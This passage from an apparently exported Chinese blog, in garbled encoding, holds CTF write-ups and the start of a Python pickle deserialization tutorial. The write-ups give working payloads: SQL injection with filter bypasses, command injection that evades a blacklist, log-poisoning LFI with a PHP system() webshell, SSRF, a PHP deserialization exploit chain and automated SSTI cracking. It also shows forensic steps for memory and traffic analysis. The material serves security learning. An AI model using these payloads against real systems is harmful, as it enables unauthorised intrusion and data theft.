&quot;/home/winter/æ¡Œé¢/volatility/problems/ljb.vmem&quot; --profile=Win7SP1x64 mimikatz\n\n\nNSSCTF&#123;W31C0M3 T0 THiS 34SY F0R3NSiCX&#125;\n\n2.è™šæ‹Ÿæœºä¸­æœ‰ä¸€ä¸ªæŸå“ç‰Œæ‰‹æœºçš„å¤‡ä»½æ–‡ä»¶ï¼Œæ–‡ä»¶é‡Œçš„å›¾ç‰‡é‡Œçš„å­—ç¬¦ä¸²ä¸º_____________ã€‚ï¼ˆè§£é¢˜è¿‡ç¨‹ä¸­éœ€è¦ç”¨åˆ°ä¸Šä¸€é¢˜ç­”æ¡ˆä¸­flag&#123;&#125;å†…çš„å†…å®¹è¿›è¡Œå¤„ç†ã€‚æœ¬é¢˜çš„æ ¼å¼ä¹Ÿæ˜¯flag&#123;xxx&#125;ï¼Œå«æœ‰ç©ºæ ¼ï¼Œæäº¤æ—¶ä¸è¦å»æ‰ï¼‰\n\npython2 vol.py --plugins=plugins -f &quot;/home/winter/æ¡Œé¢/volatility/problems/ljb.vmem&quot; --profile=Win7SP1x64 filescan |grep &quot;HUAWEI&quot;\n\n\nå¾—åˆ°åç§»é‡0x000000007d8c7d10,dumpä¸‹æ¥\npython2 vol.py --plugins=plugins -f &quot;/home/winter/æ¡Œé¢/volatility/problems/ljb.vmem&quot; --profile=Win7SP1x64 dumpfiles -Q 0x000000007d8c7d10\n\næŸ¥èµ„æ–™è¿˜å‘ç° ï¼Œç”±äºåä¸ºæ‰‹æœºåŠ©æ‰‹åŠ å¯†çš„æ–‡ä»¶è§£å¯†æ—¶éœ€è¦ä¾èµ–æ•´ä¸ªæ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶ï¼Œåªæœ‰ä¸€ä¸ªimages0.tar.encæ˜¯ä¸è¡Œçš„ã€‚éœ€è¦å¦ä¸€ä¸ªexeæ–‡ä»¶,å°±æ˜¯æ‰¾åˆ°çš„è¿™ä¸ªæ–‡ä»¶\ngithubæ‰¾åˆ°åä¸ºå¤‡ä»½æ¢å¤å·¥å…·https://github.com/RealityNet/kobackupdec\nä¸‹è½½è¯¥é¡¹ç›®ï¼Œç„¶åä½¿ç”¨å‘½ä»¤è¿›è¡Œæ¢å¤ï¼Œè¿™ä¸ªå·¥å…·éœ€è¦å¯†ç è¿›è¡Œæ¢å¤ï¼Œé‚£ä¹ˆå¯†ç å°±æ˜¯åˆšåˆšçš„ç¬¬ä¸€é—®çš„flagï¼Œè€Œä¸”æç¤ºæ˜¯â€œæ²¡æœ‰ç©ºæ ¼ï¼Œåªæœ‰ä¸‹åˆ’çº¿â€\npython3 kobackupdec.py -vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX &quot;/home/winter/backup_input/HUAWEI P40_2021-aa-bb xx.yy.zz&quot; 4 \n\nç„¶ååœ¨æ–‡ä»¶å¤¹å³å¯æ‰¾åˆ°å›¾ç‰‡\n\nNSSCTF&#123;TH4NK Y0U FOR DECRYPTING MY DATA&#125;\n\n3.[SWPUCTF 2022 ]ez_sqlæµ‹è¯•ç»•è¿‡äº†or union and å’Œç©ºæ ¼ä½†åªæ˜¯ç®€å•æŠŠè¿™äº›å­—ç¬¦ä¸²ç½®ç©º,åŒå†™ç»•è¿‡\nnss=-1&#x27;/**/ununionion/**/select/**/1,2,group_concat(database())/**/limit/**/1,1#NSS_dbnss=-1&#x27;/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=&#x27;NSS_db&#x27;limit/**/1,1#NSS_tb,usersnss=-1&#x27;/**/ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=&#x27;NSS_tb&#x27;limit/**/1,1#\n\n\nnss=-1&#x27;/**/ununionion/**/select/**/1,2,group_concat(id,Secr3t,flll444g)/**/from/**/NSS_db.NSS_tb/**/limit/**/1,1#\n\n\nNSSCTF&#123;dafe017f-0830-4583-ad8e-9a0066f166e4&#125;\n\n[MoeCTF 2021]babyRCE&lt;?php$rce = $_GET[&#x27;rce&#x27;];if (isset($rce)) &#123;    if (!preg_match(&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\\;|[0-9]|\\*|\\`|\\%|\\&gt;|\\&lt;|\\&#x27;|\\&quot;/i&quot;, $rce)) &#123;        system($rce);    &#125;else &#123;        echo &quot;hhhhhhacker!!!&quot;.&quot;\\n&quot;;    &#125;&#125;\n\nGET?rce=c\\at%09f\\lag.php\n\n\nNSSCTF&#123;e312aec7-628d-4856-8b22-70d549b5fae8&#125;\n\n[WUSTCTF 2020]æœ´å®æ— ådirsearchå‘ç°robots.txt,è®¿é—®&#x2F;fAke_f1agggg.php\n\nè®¿é—®fl4g.php\n&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;        echo &quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;;    &#125;else&#123;        die(&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;);    &#125;&#125;else&#123;    die(&quot;å»éæ´²å§&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123;   $md5=$_GET[&#x27;md5&#x27;];   if ($md5==md5($md5))       echo &quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;;   else       die(&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;);&#125;else&#123;    die(&quot;å»éæ´²å§&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123;    $get_flag = $_GET[&#x27;get_flag&#x27;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);        echo &quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;;        system($get_flag);    &#125;else&#123;        die(&quot;å¿«åˆ°éæ´²äº†&quot;);    &#125;&#125;else&#123;    die(&quot;å»éæ´²å§&quot;);&#125;?&gt;\n\n/fl4g.php?num=2019e9&amp;&amp;md5=0e215962017&amp;&amp;get_flag=tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\n\n\nNSSCTF&#123;7347029a-b29f-42a0-bdeb-3da09ef31a8c&#125;\n\n[é™‡å‰‘æ¯ 2021]ios1,2,3ä¸€ä½iosçš„å®‰å…¨ç ”ç©¶å‘˜åœ¨å®¶ä¸­ä½¿ç”¨æ‰‹æœºè”ç½‘è¢«é»‘ï¼Œä¸ä»…è¢«çªƒå¯†è¿˜ä¸¢å¤±æ¯”ç‰¹å¸è‹¥å¹²ï¼Œè¯·ä½ é€šè¿‡æµé‡å’Œæ—¥å¿—åˆ†æåä½œç­”ï¼šé»‘å®¢æ‰€æ§åˆ¶çš„C&amp;CæœåŠ¡å™¨IPæ˜¯_____________ã€‚\n\nå¯¼å‡ºhttpå¯¹è±¡,æŸ¥çœ‹å¯¼å‡ºçš„æ–‡ä»¶\n\nåœ¨wiresharkä¸ŠæŸ¥æ‰¾è¯¥å­—ç¬¦ä¸²â€ios_agentâ€\n\nwget https://github.com/ph4ntonn/Stowaway/releases/download/1.6.2/ios_agent\n\nä»è¿™ä¸ªgithubä¸‹è½½äº†ä¸ªæ–‡ä»¶ç»™äºˆæƒé™åï¼Œæ‰§è¡Œäº†ä¸€äº›å‘½ä»¤,å»ç½‘ç«™çœ‹\nå‚æ•°:-l è¢«åŠ¨æ¨¡å¼ä¸‹çš„ç›‘å¬åœ°å€[ip]:&lt;port&gt;-s èŠ‚ç‚¹é€šä¿¡åŠ å¯†å¯†é’¥,æ‰€æœ‰èŠ‚ç‚¹(admin&amp;&amp;agent)å¿…é¡»ä¸€è‡´-c ä¸»åŠ¨æ¨¡å¼ä¸‹çš„ç›®æ ‡èŠ‚ç‚¹åœ°å€--socks5-proxy socks5ä»£ç†æœåŠ¡å™¨åœ°å€--socks5-proxyu socks5ä»£ç†æœåŠ¡å™¨ç”¨æˆ·å(å¯é€‰)--socks5-proxyp socks5ä»£ç†æœåŠ¡å™¨å¯†ç (å¯é€‰)--http-proxy httpä»£ç†æœåŠ¡å™¨åœ°å€--down ä¸‹æ¸¸åè®®ç±»å‹,é»˜è®¤ä¸ºè£¸TCPæµé‡,å¯é€‰HTTP/WS--tls-enable ä¸ºèŠ‚ç‚¹é€šä¿¡å¯ç”¨TLSï¼Œåœ¨å¯ç”¨TLSåï¼ŒAESåŠ å¯†å°†è¢«ç¦ç”¨--domain æŒ‡å®šTLS SNI/WebSocketåŸŸåï¼Œè‹¥ä¸ºç©ºï¼Œé»˜è®¤ä¸ºç›®æ ‡èŠ‚ç‚¹åœ°å€--heartbeat å¼€å¯å¿ƒè·³åŒ…\n\n\nå‰ä¸‰é¢˜ç­”æ¡ˆå·²å‡º\nNSSCTF&#123;3.128.156.159&#125;NSSCTF&#123;stowaway&#125;NSSCTF&#123;hack4sec&#125;\n\n4.ä¸€ä½iosçš„å®‰å…¨ç ”ç©¶å‘˜åœ¨å®¶ä¸­ä½¿ç”¨æ‰‹æœºè”ç½‘è¢«é»‘ï¼Œä¸ä»…è¢«çªƒå¯†è¿˜ä¸¢å¤±æ¯”ç‰¹å¸è‹¥å¹²ï¼Œè¯·ä½ é€šè¿‡æµé‡å’Œæ—¥å¿—åˆ†æåä½œç­”ï¼šé»‘å®¢é€šè¿‡SQLç›²æ³¨æ‹¿åˆ°äº†ä¸€ä¸ªæ•æ„Ÿæ•°æ®ï¼Œå†…å®¹æ˜¯____________\n\næµé‡åŒ…å†…å­˜åœ¨tlsæµé‡,ä½¿ç”¨é™„ä»¶é‡Œçš„keylog.txtè§£å¯†httpsæµé‡\nç¼–è¾‘â€”â€”é¦–é€‰é¡¹â€”â€”protocolsâ€”â€”TLSâ€”â€”å¯¼å…¥keylog.txt\nå¯¼å…¥åå°±å¯ä»¥åœ¨è¿™é‡Œæœç´¢http2ï¼Œçœ‹åˆ°è§£å¯†åçš„æ•°æ®äº†\n\né¢˜ç›®ä¸Šè¯´é»‘å®¢é€šè¿‡SQLç›²æ³¨æ‹¿åˆ°äº†ä¸€ä¸ªæ•æ„Ÿæ•°æ®ã€‚æˆ‘ä»¬åœ¨åˆ†ç»„åˆ—è¡¨ä¸­æœç´¢selectï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ç›²æ³¨\n\nä¸€ä¸ªä¸ªæŠŠåå…­è¿›åˆ¶çš„å€¼æå–å‡ºæ¥\n746558f3-c841-456b-85d7-d6c0f2edabb2NSSCTF&#123;746558f3-c841-456b-85d7-d6c0f2edabb2&#125;\n\n6.é»‘å®¢ç«¯å£æ‰«æçš„æ‰«æå™¨çš„æ‰«æèŒƒå›´æ˜¯**__**ã€‚\nç«¯å£æ‰«æä¼šæ¶‰åŠåˆ°TCPçš„RST\n\nRSTè¡¨ç¤ºå¤ä½ï¼Œç”¨æ¥å¼‚å¸¸çš„å…³é—­è¿æ¥ï¼Œåœ¨TCPçš„è®¾è®¡ä¸­å®ƒæ˜¯ä¸å¯æˆ–ç¼ºçš„ã€‚å°±åƒä¸Šé¢è¯´çš„ä¸€æ ·ï¼Œå‘é€RSTåŒ…å…³é—­è¿æ¥æ—¶ï¼Œä¸å¿…ç­‰ç¼“å†²åŒºçš„åŒ…éƒ½å‘å‡ºå»ï¼ˆä¸åƒä¸Šé¢çš„FINåŒ…ï¼‰ï¼Œç›´æ¥å°±ä¸¢å¼ƒç¼“å­˜åŒºçš„åŒ…å‘é€RSTåŒ…ã€‚è€Œæ¥æ”¶ç«¯æ”¶åˆ°RSTåŒ…åï¼Œä¹Ÿä¸å¿…å‘é€ACKåŒ…æ¥ç¡®è®¤ã€‚ TCPå¤„ç†ç¨‹åºä¼šåœ¨è‡ªå·±è®¤ä¸ºçš„å¼‚å¸¸æ—¶åˆ»å‘é€RSTåŒ…ã€‚ä¾‹å¦‚ï¼ŒAå‘Bå‘èµ·è¿æ¥ï¼Œä½†Bä¹‹ä¸Šå¹¶æœªç›‘å¬ç›¸åº”çš„ç«¯å£ï¼Œè¿™æ—¶Bæ“ä½œç³»ç»Ÿä¸Šçš„TCPå¤„ç†ç¨‹åºä¼šå‘RSTåŒ…ã€‚\n\næ—¢ç„¶æ˜¯ç«¯å£æ‰«æï¼Œå¿…ç„¶ä¼šæ¶‰åŠåˆ°rstæŠ¥æ–‡å’Œè¿ç»­ç«¯å£è®¿é—®ï¼Œæˆ‘ä»¬æ‰“å¼€ä¸“å®¶ä¿¡æ¯æ‰¾åˆ°rst\n\n\nä»10-499éƒ½æœ‰RSTåŒ…\nNSSCTF&#123;10-499&#125;\n\n[HNCTF 2022 WEEK2]easy_include&lt;?php//WEBæ‰‹è¦æ‡‚å¾—æœç´¢if(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    if(preg_match(&quot;/php|flag|data|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=/i&quot;, $file))&#123;        die(&quot;error&quot;);    &#125;    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;\n\nfileæ²¡ban,*ä¹Ÿè¿‡æ»¤äº†,å°è¯•æ—¥å¿—å†™é©¬\n?file=file:///var/log/nginx/access.loguaå¤´:&lt;?php system(&#x27;cat /f*&#x27;)?&gt;\n\n\nNSSCTF&#123;369b1fe1-de00-44fb-b9df-1d66cda1c443&#125;\n\n[HNCTF 2022 WEEK2]ez_ssrf\nè¿›æ¥ä¸€ä¸ªapacheé»˜è®¤ç•Œé¢å‘ç°æ˜¯2.4.38,ä¸Šç½‘æœä¸€ä¸‹æ¼æ´\nhttps://www.cnblogs.com/jdslf/p/16846682.html\ndirsearchæ‰«æåˆ°index.php\n&lt;?phphighlight_file(__FILE__);error_reporting(0);$data=base64_decode($_GET[&#x27;data&#x27;]);$host=$_GET[&#x27;host&#x27;];$port=$_GET[&#x27;port&#x27;];$fp=fsockopen($host,intval($port),$error,$errstr,30);//å»ºç«‹ä¸€ä¸ª socket è¿æ¥,æ¥æ”¶$hostä¸»æœºå‚æ•°ï¼Œ$portç«¯å£å‚æ•°ï¼ˆå…ˆä¼šè¢«è½¬ä¸ºæ•´æ•°ï¼‰ï¼Œ$errorä¸ºé”™è¯¯å·ï¼Œè®¾ä¸ºé0ï¼›$errstr (é”™è¯¯ä¿¡æ¯): å¦‚æœè¿æ¥å¤±è´¥ï¼Œè¿™ä¸ªå‚æ•°ä¼šåŒ…å«ä¸€ä¸ªå­—ç¬¦ä¸²æè¿°çš„é”™è¯¯ä¿¡æ¯ã€‚30ç§’è¶…æ—¶if(!$fp) &#123;/// å¦‚æœ$fpæœ‰é”™è¯¯ï¼Œä¹Ÿå°±æ˜¯è¿”å›çš„æ˜¯é0ï¼Œå–åä¸º0ï¼Œæ‰§è¡Œé€€å‡º    die();&#125;else &#123;    fwrite($fp,$data);// fwriteå‡½æ•°æ¥æ”¶$fpç¼–ç åçš„æ•°æ®    while(!feof($data))//feofåˆ¤æ–­æ˜¯å¦è¾¾åˆ°æ•°æ®æœ«å°¾    &#123;        echo fgets($fp,128);// è¾“å‡º fgetsï¼Œfgetsæ¥æ”¶æ¥è‡ª$fpçš„æ•°æ®ï¼Œå¹¶ä¸”è¯»å–æœ€å¤§128ä¸ªå­—èŠ‚æ•°    &#125;    fclose($fp);&#125;\n\né‚£æˆ‘ä»¬å¯ä»¥ssrf,ä¼ªé€ ä¸€ä¸ªhttpè¯·æ±‚å¤´,è®©socketå’Œ127.0.0.1è¿æ¥,æŠŠæ„é€ çš„æ•°æ®å†™å…¥åˆ°è¿æ¥çš„ socket ä¸­,å†ä»è¿æ¥ä¸­è¯»å–è¿”å›çš„å“åº”æ•°æ®\n&lt;?php$out = &quot;GET /flag.php HTTP/1.1\\r\\n&quot;;$out .= &quot;Host: 127.0.0.1\\r\\n&quot;;$out .= &quot;Connection: Keep-Alive\\r\\n\\r\\n&quot;;echo $out;echo base64_encode($out)?&gt;R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBLZWVwLUFsaXZlDQoNCg==?host=127.0.0.1&amp;port=80&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBLZWVwLUFsaXZlDQoNCg==\n\n\nnssctf&#123;095948b9b2be-8444-3750-99ba94d3b4f5&#125;\n\n[ç¬¬äº”ç©ºé—´ 2021]pklovecloud&lt;?php  include &#x27;flag.php&#x27;;class pkshow &#123;      function echo_name()         &#123;                  return &quot;Pk very safe^.^&quot;;          &#125;  &#125; class acp &#123;       protected $cinder;      public $neutron;    public $nova;    function __construct()     &#123;              $this-&gt;cinder = new pkshow;    &#125;      function __toString()          &#123;                  if (isset($this-&gt;cinder))              return $this-&gt;cinder-&gt;echo_name();          &#125;  &#125;  class ace&#123;        public $filename;         public $openstack;    public $docker;     function echo_name()          &#123;           $this-&gt;openstack = unserialize($this-&gt;docker);        $this-&gt;openstack-&gt;neutron = $heat;        if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)        &#123;        $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;            if (file_get_contents($file))                     &#123;                              return file_get_contents($file);             &#125;              else             &#123;                 return &quot;keystone lost~&quot;;             &#125;            &#125;    &#125;  &#125;  if (isset($_GET[&#x27;pks&#x27;]))  &#123;    $logData = unserialize($_GET[&#x27;pks&#x27;]);    echo $logData; &#125; else &#123;     highlight_file(__file__); &#125;?&gt;\n\né€šè¿‡aceç±»é‡Œçš„echo_nameæ–¹æ³•include flag.php,å‘ç°acpé‡Œæœ‰__tostringæ–¹æ³•,å†çœ‹åˆ°aceç±»é‡Œæœ‰echo $logDataè¿™ä¸€å¥,æˆ‘ä»¬æŠŠ$logDataè®¾ç½®ä¸ºacpå¯¹è±¡å³å¯è§¦å‘__tostringæ–¹æ³•\nfunction __construct() &#123;          $this-&gt;cinder = new ace;&#125;\n\nç„¶åçœ‹echo_nameæ–¹æ³•,ä¸è®©ä»–ååºåˆ—åŒ–å°±è‡ªç„¶ç»•è¿‡ifäº†,é‚£ä¹ˆå°±è®©$docker&#x3D;nullå³å¯,è¿™æ ·$openstacä¹Ÿä¸ºnull\nexp:\n&lt;?phpclass pkshow&#123;    function echo_name()    &#123;        return &quot;Pk very safe^.^&quot;;    &#125;&#125;class acp&#123;    protected $cinder;    public $neutron;    public $nova;    function __construct()    &#123;        $this-&gt;cinder = new ace;    &#125;    function __toString()    &#123;    &#125;&#125;class ace&#123;    public $filename=&#x27;flag.php&#x27;;    public $openstack;    public $docker=null;&#125;$a= new acp();echo urlencode(serialize($a));?&gt;O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3BN%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D\n\n\nflagåœ¨&#x2F;nssctfasdasdflag,æ”¹ä¸€ä¸‹filenameå³å¯,æ”¹ä¸€æ¬¡ä¸è¡Œ,æ”¹æˆ..&#x2F;æ‰å¯¹\n\nNSSCTF&#123;f356c7e2-a4bc-47d2-8e8c-b1c8854afb71&#125;\n\n[HNCTF 2022 WEEK3]sssstiçŒœåˆ°å‚æ•°æ˜¯name,è¯•ç»§æ‰¿é“¾çš„æ—¶å€™é¡ºä¾¿æµ‹è¯•ä¸€ä¸‹waf,fenjingä¸€æŠŠæ¢­\npython -m fenjing crack -u http://node5.anna.nssctf.cn:29433/ --method GET --inputs name\n\n\nNSSCTF&#123;e5b9ec3b-6c84-4b83-a887-bb1e78e1513c&#125;\n\n","categories":["nssctf"],"tags":["nssctf"]},{"title":"pythonååºåˆ—åŒ–","url":"/2025/09/10/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"åŸºç¡€çš„pickleååºåˆ—åŒ–ä»‹ç»å’Œphpçš„ååºåˆ—åŒ–ä¸€æ ·,pythonä¹Ÿå­˜åœ¨ååºåˆ—åŒ–,éƒ½æ˜¯ä¸ºäº†è§£å†³å¯¹è±¡ä¼ è¾“ä¸æŒä¹…åŒ–å‚¨å­˜é—®é¢˜\nç›¸å…³åº“å’Œæ–¹æ³•åœ¨pythonä¸­æœ‰ä¸¤ä¸ªåº“æ˜¯ç”¨æ¥åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–æ“ä½œçš„,åˆ†åˆ«æ˜¯pickle&#x2F;cPickle,(åœ¨pythonå®˜æ–¹æ–‡æ¡£ä¸­,æ„æ€æ˜¯å°å­˜&#x2F;è§£å°),æ¯”è¾ƒå¸¸è§çš„æ˜¯dumps(åºåˆ—åŒ–)å’Œloads(ååºåˆ—åŒ–)\nimport pickleclass Test:    def __init__(self):        self.a = 1test = Test()serialized = pickle.dumps(test)print(serialized)unserialized = pickle.loads(serialized)print(unserialized.a)&quot;&quot;&quot;b&#x27;\\x80\\x04\\x95&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x04Test\\x94\\x93\\x94)\\x81\\x94&#125;\\x94\\x8c\\x01a\\x94K\\x01sb.&#x27;1&quot;&quot;&quot;\n\nç¬¬ä¸€è¡Œçœ‹èµ·æ¥ä¸å¤ªå¯è¯»,ä¸‹é¢æ˜¯è§£é‡Š\nPVMè¦å¯¹åºåˆ—åŒ–ã€ååºåˆ—åŒ–å¾ˆæ¸…æ¥šçš„è¯ï¼Œä¸€å®šè¦äº†è§£ PVM\né¦–å…ˆï¼Œåœ¨è°ƒç”¨ pickle çš„æ—¶å€™ï¼Œå®é™…ä¸Šæ˜¯ class pickle.Pickler å’Œ class pickle.Unpickler åœ¨èµ·ä½œç”¨ï¼Œè€Œè¿™ä¸¤ä¸ªç±»åˆæ˜¯ä¾é  Pickle Virtual Machine(PVM)ï¼Œåœ¨æ›´æ·±å±‚å¯¹è¾“å…¥è¿›è¡Œç€æŸç§æ“ä½œï¼Œä»è€Œæœ€åå¾—åˆ°äº†é‚£ä¸²å¤æ‚çš„ç»“æœã€‚\nPVM ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š\n\næŒ‡ä»¤å¤„ç†å™¨ï¼šä»æµä¸­è¯»å– opcode å’Œå‚æ•°ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†ã€‚é‡å¤è¿™ä¸ªåŠ¨ä½œï¼Œç›´åˆ°é‡åˆ° . è¿™ä¸ªç»“æŸç¬¦ååœæ­¢ï¼ˆçœ‹ä¸Šé¢çš„ä»£ç ç¤ºä¾‹ï¼Œåºåˆ—åŒ–ä¹‹åçš„ç»“æœæœ€åæ˜¯ .ï¼‰ã€‚æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼š\nopcodeæ˜¯å•å­—èŠ‚çš„\nå¸¦å‚æ•°çš„æŒ‡ä»¤ç”¨æ¢è¡Œç¬¦æ¥ç¡®å®šè¾¹ç•Œ\n\n\næ ˆåŒº:ç”¨listå®ç°çš„,è¢«ç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡\nå†…å­˜å»:ç”¨ dict å®ç°çš„ï¼Œä¸º PVM çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸæä¾›å­˜å‚¨\n\næœ€åï¼ŒPVM è¿˜æœ‰åè®®ä¸€è¯´ï¼Œè¿™é‡Œçš„åè®®æŒ‡å®šäº†åº”è¯¥é‡‡ç”¨ä»€ä¹ˆæ ·çš„åºåˆ—åŒ–ã€ååºåˆ—åŒ–ç®—æ³•\nPVMåè®®å½“å‰å…±æœ‰ 6 ç§ä¸åŒçš„åè®®å¯ç”¨ï¼Œä½¿ç”¨çš„åè®®ç‰ˆæœ¬è¶Šé«˜ï¼Œè¯»å–æ‰€ç”Ÿæˆ pickle å¯¹è±¡æ‰€éœ€çš„ Python ç‰ˆæœ¬å°±è¦è¶Šæ–°\n\nv0 ç‰ˆåè®®æ˜¯åŸå§‹çš„â€œäººç±»å¯è¯»â€åè®®ï¼Œå¹¶ä¸”å‘åå…¼å®¹æ—©æœŸç‰ˆæœ¬çš„ Python\nv1 ç‰ˆåè®®æ˜¯è¾ƒæ—©çš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œå®ƒä¹Ÿä¸æ—©æœŸç‰ˆæœ¬çš„ Python å…¼å®¹\nv2 ç‰ˆåè®®æ˜¯åœ¨ Python 2.3 ä¸­åŠ å…¥çš„ï¼Œå®ƒä¸ºå­˜å‚¨ new-style class æä¾›äº†æ›´é«˜æ•ˆçš„æœºåˆ¶ï¼ˆå‚è€ƒ PEP 307ï¼‰ã€‚\nv3 ç‰ˆåè®®æ˜¯åœ¨ Python 3.0 ä¸­åŠ å…¥çš„ï¼Œå®ƒæ˜¾å¼åœ°æ”¯æŒ bytes å­—èŠ‚å¯¹è±¡ï¼Œä¸èƒ½ä½¿ç”¨ Python 2.x è§£å°ã€‚è¿™æ˜¯ Python 3.0-3.7 çš„é»˜è®¤åè®®ã€‚\nv4 ç‰ˆåè®®æ·»åŠ äº Python 3.4ã€‚å®ƒæ”¯æŒå­˜å‚¨éå¸¸å¤§çš„å¯¹è±¡ï¼Œèƒ½å­˜å‚¨æ›´å¤šç§ç±»çš„å¯¹è±¡ï¼Œè¿˜åŒ…æ‹¬ä¸€äº›é’ˆå¯¹æ•°æ®æ ¼å¼çš„ä¼˜åŒ–ï¼ˆå‚è€ƒ PEP 3154ï¼‰ã€‚å®ƒæ˜¯ Python 3.8 ä½¿ç”¨çš„é»˜è®¤åè®®ã€‚\nv5 ç‰ˆåè®®æ˜¯åœ¨ Python 3.8 ä¸­åŠ å…¥çš„ã€‚å®ƒå¢åŠ äº†å¯¹å¸¦å¤–æ•°æ®çš„æ”¯æŒï¼Œå¹¶å¯åŠ é€Ÿå¸¦å†…æ•°æ®å¤„ç†ï¼ˆå‚è€ƒ PEP 574ï¼‰ã€‚\n\nä¸Šé¢çš„ä»£ç ç¤ºä¾‹å…¶å®å¯ä»¥æŒ‡å®šPVMåè®®çš„ç‰ˆæœ¬,æƒ³å¾—åˆ°äººç±»æ˜“è¯»çš„ç‰ˆæœ¬çš„è¯,å¯ä»¥æŒ‡å®šä¸€ä¸‹ç‰ˆæœ¬\nimport pickleclass Test:    def __init__(self):        self.a = 1test = Test()serialized = pickle.dumps(test,protocol=0)print(serialized)unserialized = pickle.loads(serialized)print(unserialized.a)\n\nç»“æœå¦‚ä¸‹:\nb&#x27;ccopy_reg\\n_reconstructor\\np0\\n(c__main__\\nTest\\np1\\nc__builtin__\\nobject\\np2\\nNtp3\\nRp4\\n(dp5\\nVa\\np6\\nI1\\nsb.&#x27;1\n\nå…³é”®ä»£ç \npickle.dumps(obj[, protocol])\n\n\nåŠŸèƒ½ï¼šå°†objå¯¹è±¡åºåˆ—åŒ–ä¸ºstringå½¢å¼ï¼Œè€Œä¸æ˜¯å­˜å…¥æ–‡ä»¶ä¸­ã€‚ å‚æ•°: objï¼šæƒ³è¦åºåˆ—åŒ–çš„objå¯¹è±¡ã€‚ protocalï¼šå¦‚æœè¯¥é¡¹çœç•¥ï¼Œåˆ™é»˜è®¤ä¸º0ã€‚å¦‚æœä¸ºè´Ÿå€¼æˆ–HIGHEST_PROTOCOLï¼Œåˆ™ä½¿ç”¨æœ€é«˜çš„åè®®ç‰ˆæœ¬ã€‚\n\npickle.loads(string)\n\n\nåŠŸèƒ½ï¼šä»stringä¸­è¯»å‡ºåºåˆ—åŒ–å‰çš„objå¯¹è±¡ã€‚ å‚æ•°: stringï¼šæ–‡ä»¶åç§°ã€‚\n\nåœ¨åºåˆ—åŒ–æ—¶ï¼Œåè®®ç‰ˆæœ¬æ˜¯è‡ªåŠ¨æ£€æµ‹å‡ºæ¥çš„ï¼Œæ‰€ä»¥è¯¸å¦‚ loads 